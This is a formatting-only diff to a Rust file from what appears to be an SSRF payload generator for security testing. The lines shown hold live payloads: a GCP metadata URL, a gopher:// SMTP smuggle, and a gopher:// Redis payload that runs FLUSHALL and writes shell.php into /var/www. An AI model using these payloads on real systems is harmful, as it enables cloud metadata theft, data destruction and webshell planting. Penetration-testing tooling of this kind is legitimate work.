@@ -83,7 +83,8 @@ pub fn generate_payloads(
         });
         payloads.push(Payload {
             name: "GCP — instance attributes".to_string(),
-            url: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/".to_string(),
+            url: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
+                .to_string(),
             description: "GCP instance attributes (startup scripts, custom metadata)".to_string(),
             category: PayloadCategory::GcpMetadata,
         });
@@ -147,13 +148,13 @@ pub fn generate_payloads(
         });
         payloads.push(Payload {
             name: "Smuggle — gopher:// SMTP".to_string(),
-            url: format!("gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM:<test@test.com>%0ARCPT%20TO:<root@localhost>%0ADATA%0ASubject:%20SSRF%0ATest%0A.%0AQUIT%0A"),
+            url: "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM:<test@test.com>%0ARCPT%20TO:<root@localhost>%0ADATA%0ASubject:%20SSRF%0ATest%0A.%0AQUIT%0A".to_string(),
             description: "Send email via SMTP using gopher:// protocol".to_string(),
             category: PayloadCategory::ProtocolSmuggle,
         });
         payloads.push(Payload {
             name: "Smuggle — gopher:// Redis".to_string(),
-            url: format!("gopher://127.0.0.1:6379/_FLUSHALL%0ASET%20foo%20bar%0ACONFIG%20SET%20dir%20/var/www%0ACONFIG%20SET%20dbfilename%20shell.php%0ASAVE%0A"),
+            url: "gopher://127.0.0.1:6379/_FLUSHALL%0ASET%20foo%20bar%0ACONFIG%20SET%20dir%20/var/www%0ACONFIG%20SET%20dbfilename%20shell.php%0ASAVE%0A".to_string(),
             description: "Write webshell via Redis using gopher:// protocol".to_string(),
             category: PayloadCategory::ProtocolSmuggle,
         });
@@ -179,7 +180,11 @@ pub fn generate_payloads(
 }
 
 pub fn print_payloads(payloads: &[Payload]) {
-    println!("{} Generated {} SSRF payloads:", "[*]".cyan().bold(), payloads.len());
+    println!(
+        "{} Generated {} SSRF payloads:",
+        "[*]".cyan().bold(),
+        payloads.len()
+    );
     println!("{}", "─".repeat(60).dimmed());
 
     let mut current_cat = "";
